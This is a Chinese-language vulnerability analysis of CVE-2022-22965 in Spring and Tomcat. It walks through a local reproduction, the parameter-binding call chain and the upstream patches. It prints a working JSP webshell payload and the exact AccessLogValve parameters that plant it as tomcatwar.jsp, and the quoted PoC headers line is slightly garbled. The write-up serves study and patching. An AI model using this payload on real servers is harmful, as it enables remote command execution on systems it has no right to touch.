## 二、漏洞复现步骤

1. 在 `ApplicationMain` 类中添加以下代码：
   ```java
   public static void main(String[] args) {
       SpringApplication.run(ApplicationMain.class, args);
   }
   ```

2. 将章节1.1 SpringMVC参数绑定中的 `User` 类和 `UserController` 类添加到项目中。

3. 执行 Maven 打包命令，将项目打包为 WAR 包：
   ```sh
   mvn clean package
   ```

4. 将项目中 `target` 目录里生成的 `CVE-2022-22965-0.0.1-SNAPSHOT.war` 文件复制到 Tomcat 的 `webapps` 目录下，并启动 Tomcat。

5. 下载 POC 文件，并执行如下命令：
   ```sh
   python3 poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser
   ```

6. 在浏览器中访问 `http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=gnome-calculator`，以复现漏洞。

## 三、漏洞分析

### 3.1 POC 分析

我们从 POC 入手进行分析。通过对 POC 中的数据 URL 解码后，可以拆分成以下五对参数。

#### 3.1.1 pattern 参数
- **参数名**：`class.module.classLoader.resources.context.parent.pipeline.first.pattern`
- **参数值**：`%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`

很明显，这个参数是 SpringMVC 多层嵌套参数绑定。我们可以推测出如下的调用链：
```java
User.getClass()  
java.lang.Class.getModule()  
...  
SomeClass.setPattern()
```

那么实际运行过程中的调用链是怎样的呢？`SomeClass` 是哪个类呢？带着这些问题，我们在前置知识中提到的实现 SpringMVC 参数绑定的主要方法 `WebDataBinder.doBind(MutablePropertyValues)` 上设置断点。

经过一系列的调用逻辑后，我们来到 `AbstractNestablePropertyAccessor` 第 814 行的 `getPropertyAccessorForPropertyPath(String)` 方法。该方法通过递归调用自身，实现对 `class.module.classLoader.resources.context.parent.pipeline.first.pattern` 的递归解析，设置整个调用链。

我们重点关注第 820 行：
```java
AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);
```
该行主要实现每层嵌套参数的获取。我们在该行设置断点，查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。

##### 第一轮迭代
- 进入 `getPropertyAccessorForPropertyPath(String)` 方法前：
  - `this`：`User` 的 `BeanWrapperImpl` 包装实例
  - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern`
  - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern`
  - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数

- 经过一系列的调用逻辑后，最终来到 `BeanWrapperImpl` 第 308 行的 `BeanPropertyHandler.getValue()` 方法中。可以看到 `class` 嵌套参数最终通过反射调用 `User` 的父类 `java.lang.Object.getClass()`，获得返回 `java.lang.Class` 实例。

- `getPropertyAccessorForPropertyPath(String)` 方法返回后：
  - `this`：`User` 的 `BeanWrapperImpl` 包装实例
  - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern`
  - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern`，作为下一轮迭代的 `propertyPath`
  - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数
  - `nestedPa`：`java.lang.Class` 的 `BeanWrapperImpl` 包装实例，作为下一轮迭代的 `this`

经过第一轮迭代，我们可以得出第一层调用链：
```java
User.getClass()  
java.lang.Class.get???() // 下一轮迭代实现
```

##### 第二轮迭代
- `module` 嵌套参数最终通过反射调用 `java.lang.Class.getModule()`，获得返回 `java.lang.Module` 实例。

经过第二轮迭代，我们可以得出第二层调用链：
```java
User.getClass()  
java.lang.Class.getModule()  
java.lang.Module.get???() // 下一轮迭代实现
```

##### 第三轮迭代
- `classLoader` 嵌套参数最终通过反射调用 `java.lang.Module.getClassLoader()`，获得返回 `org.apache.catalina.loader.ParallelWebappClassLoader` 实例。

经过第三轮迭代，我们可以得出第三层调用链：
```java
User.getClass()  
java.lang.Class.getModule()  
java.lang.Module.getClassLoader()  
org.apache.catalina.loader.ParallelWebappClassLoader.get???() // 下一轮迭代实现
```

接着按照上述调试方法，依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：
```java
User.getClass()  
java.lang.Class.getModule()  
java.lang.Module.getClassLoader()  
org.apache.catalina.loader.ParallelWebappClassLoader.getResources()  
org.apache.catalina.webresources.StandardRoot.getContext()  
org.apache.catalina.core.StandardContext.getParent()  
org.apache.catalina.core.StandardHost.getPipeline()  
org.apache.catalina.core.StandardPipeline.getFirst()  
org.apache.catalina.valves.AccessLogValve.setPattern()
```

可以看到，`pattern` 参数最终对应 `AccessLogValve.setPattern()`，即将 `AccessLogValve` 的 `pattern` 属性设置为 `%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i`，也就是 `access_log` 的文件内容格式。

我们再来看 `pattern` 参数值，除了常规的 Java 代码外，还夹杂了三个特殊片段。通过翻阅 `AccessLogValve` 的父类 `AbstractAccessLogValve` 的源码，可以找到相关的文档：
- 通过 `AccessLogValve` 输出的日志中可以通过形如 `%{param}i` 等形式直接引用 HTTP 请求和响应中的内容。完整文档请参考文章末尾的参考章节。

结合 `poc.py` 中的 `headers` 变量内容：
```python
headers = {"suffix":"%>//", "c1":"Runtime", "c2":"//}
```

很明显，这是一个 JSP webshell。这个 webshell 输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。

#### 3.1.2 suffix 参数
- **参数名**：`class.module.classLoader.resources.context.parent.pipeline.first.suffix`
- **参数值**：`.jsp`

按照 `pattern` 参数相同的调试方法，`suffix` 参数最终将 `AccessLogValve.suffix` 设置为 `.jsp`，即 `access_log` 的文件名后缀。

#### 3.1.3 directory 参数
- **参数名**：`class.module.classLoader.resources.context.parent.pipeline.first.directory`
- **参数值**：`webapps/ROOT`

按照 `pattern` 参数相同的调试方法，`directory` 参数最终将 `AccessLogValve.directory` 设置为 `webapps/ROOT`，即 `access_log` 的文件输出目录。

这里提一下 `webapps/ROOT` 目录，该目录为 Tomcat Web 应用根目录。部署到该目录下的 Web 应用，可以直接通过 `http://localhost:8080/` 访问。

#### 3.1.4 prefix 参数
- **参数名**：`class.module.classLoader.resources.context.parent.pipeline.first.prefix`
- **参数值**：`tomcatwar`

按照 `pattern` 参数相同的调试方法，`prefix` 参数最终将 `AccessLogValve.prefix` 设置为 `tomcatwar`，即 `access_log` 的文件名前缀。

#### 3.1.5 fileDateFormat 参数
- **参数名**：`class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat`
- **参数值**：空

按照 `pattern` 参数相同的调试方法，`fileDateFormat` 参数最终将 `AccessLogValve.fileDateFormat` 设置为空，即 `access_log` 的文件名不包含日期。

#### 3.1.6 总结
至此，经过上述的分析，结论非常清晰了：通过请求传入的参数，利用 SpringMVC 参数绑定机制，控制了 Tomcat `AccessLogValve` 的属性，让 Tomcat 在 `webapps/ROOT` 目录输出定制的“访问日志” `tomcatwar.jsp`，该“访问日志”实际上为一个 JSP webshell。

在 SpringMVC 参数绑定的实际调用链中，有几个关键点直接影响到了漏洞能否成功利用。

### 3.2 漏洞利用关键点

#### 3.2.1 关键点一：Web 应用部署方式
从 `java.lang.Module` 到 `org.apache.catalina.loader.ParallelWebappClassLoader`，是将调用链转移到 Tomcat 并最终利用 `AccessLogValve` 输出 webshell 的关键。

`ParallelWebappClassLoader` 在 Web 应用以 WAR 包部署到 Tomcat 中时使用到。现在很大部分公司会使用 SpringBoot 可执行 JAR 包的方式运行 Web 应用，在这种方式下，我们看下 `classLoader` 嵌套参数被解析为什么，如下图：

可以看到，使用 SpringBoot 可执行 JAR 包的方式运行，`classLoader` 嵌套参数被解析为 `org.springframework.boot.loader.LaunchedURLClassLoader`，查看其源码，没有 `getResources()` 方法。具体源码请参考文章末尾的参考章节。

这就是为什么本漏洞利用条件之一，Web 应用部署方式需要是 Tomcat WAR 包部署。

#### 3.2.2 关键点二：JDK 版本
在前面章节中 `AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);` 调用的过程中，实际上 Spring 做了一道防御。

Spring 使用 `org.springframework.beans.CachedIntrospectionResults` 缓存并返回 Java Bean 中可以被 `BeanWrapperImpl` 使用的 `PropertyDescriptor`。在 `CachedIntrospectionResults` 第 289 行构造方法中：
```java
if (beanClass == Class.class) {
    return null;
}
```

该行的意思是：当 Bean 的类型为 `java.lang.Class` 时，不返回 `classLoader` 和 `protectionDomain` 的 `PropertyDescriptor`。Spring 在构建嵌套参数的调用链时，会根据 `CachedIntrospectionResults` 缓存的 `PropertyDescriptor` 进行构建：
- 不返回，也就意味着 `class.classLoader...` 这种嵌套参数走不通，即形如下方的调用链：
  ```java
  Foo.getClass()  
  java.lang.Class.getClassLoader()  
  BarClassLoader.getBaz()  
  ...
  ```
这在 JDK >= 1.9 时有效。

## 四、补丁分析

### 4.1 Spring 5.3.18 补丁
通过对比 Spring 5.3.17 和 5.3.18 的版本，可以看到在 3 月 31 日有一项名为“Redefine PropertyDescriptor filter”的提交。

进入该提交，可以看到对 `CachedIntrospectionResults` 构造函数中 Java Bean 的 `PropertyDescriptor` 的过滤条件被修改了：当 Java Bean 的类型为 `java.lang.Class` 时，仅允许获取 `name` 以及 `Name` 后缀的属性描述符。在章节 3.2.2 关键点二：JDK 版本中，利用 `java.lang.Class.getModule()` 的链路就走不通了。

### 4.2 Tomcat 9.0.62 补丁
通过对比 Tomcat 9.0.61 和 9.0.62 的版本，可以看到在 4 月 1 日有一项名为“Security hardening. Deprecate getResources() and always return null.” 的提交。

进入该提交，可以看到对 `getResources()` 方法的返回值做了修改，直接返回 `null`。`WebappClassLoaderBase` 即 `ParallelWebappClassLoader` 的父类，在章节 3.2.1 关键点一：Web 应用部署方式中，利用 `org.apache.catalina.loader.ParallelWebappClassLoader.getResources()` 的链路就走不通了。

## 五、思考

通过将代码输出到日志文件，并控制日志文件被解释执行，这在漏洞利用方法中也较为常见。通常事先往服务器上写入包含代码的“日志”文件，并利用文件包含漏洞解释执行该“日志”文件。写入“日志”文件可以通过 Web 服务中间件自身的日志记录功能顺带实现，也可以通过 SQL 注入、文件上传漏洞等曲线实现。

与上文不同的是，本次漏洞并不需要文件包含。究其原因，Java Web 服务中间件自身也是用 Java 编写和运行的，而部署运行在上面的 Java Web 应用，实际上是 Java Web 服务中间件进程的一部分，两者间通过 Servlet API 标准接口在进程内部进行“通讯”。依靠 Java 语言强大的运行期反射能力，给予了攻击者可以通过 Java Web 应用漏洞进而攻击 Java Web 服务中间件的能力。也就是本次利用 Web 应用自身的 Spring 漏洞，进而修改了 Web 服务中间件 Tomcat 的 `access_log` 配置内容，直接输出可执行的“日志”文件到 Web 应用目录下。

在日常开发中，应该严格控制 Web 应用可解释执行目录为只读不可写，日志、上传文件等运行期可以修改的目录应该单独设置，并且不可执行。

本次漏洞虽然目前调用链中仅利用到了 Tomcat，但只要存在一个从 Web 应用到 Web 服务中间件的 `class.module.classLoader....` 合适调用链，理论上 Jetty、Weblogic、Glassfish 等也可利用。另外，目前通过写入日志文件的方式，也可能通过其他文件，比如配置文件，甚至是内存马的形式出现。

本次漏洞目前唯一令人“欣慰”的一点是，仅对 JDK >= 1.9 有效。相信不少公司均为“版本任你发，我用 Java 8！”的状态，但这也仅仅是目前。与其抱着侥幸心理，不如按计划老老实实升级 Spring。

同 Log4jShell 中的 Log4j2 一样，Spring 框架几乎是一个类似 JDK 级别的基础类库，即便自身应用程序里完成了升级，但仍有极其庞大的其他框架、中间件，导致升级工作同样极为困难。绝大部分公司采取的方案是在边界防护设备上使用“临时补丁”的方式。同时，大量 bypass 方法也随之而来，这将是一个漫长的过程。

“临时补丁”意味着无法根除，而底层依赖的升级又极为耗时，那么，如何更好地发现并规避在此期间产生的风险呢？

## 参考
- Tomcat access_log 配置参考文档
- Spring 5.3.17 和 5.3.18 版本比较：[https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18](https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18)
- Spring 5.3.18 补丁提交内容
- Tomcat 9.0.61 和 9.0.62 版本比较：[https://github.com/apache/tomcat/compare/9.0.61...9.0.62](https://github.com/apache/tomcat/compare/9.0.61...9.0.62)
- Tomcat 9.0.62 补丁提交内容
- LaunchedURLClassLoader 源码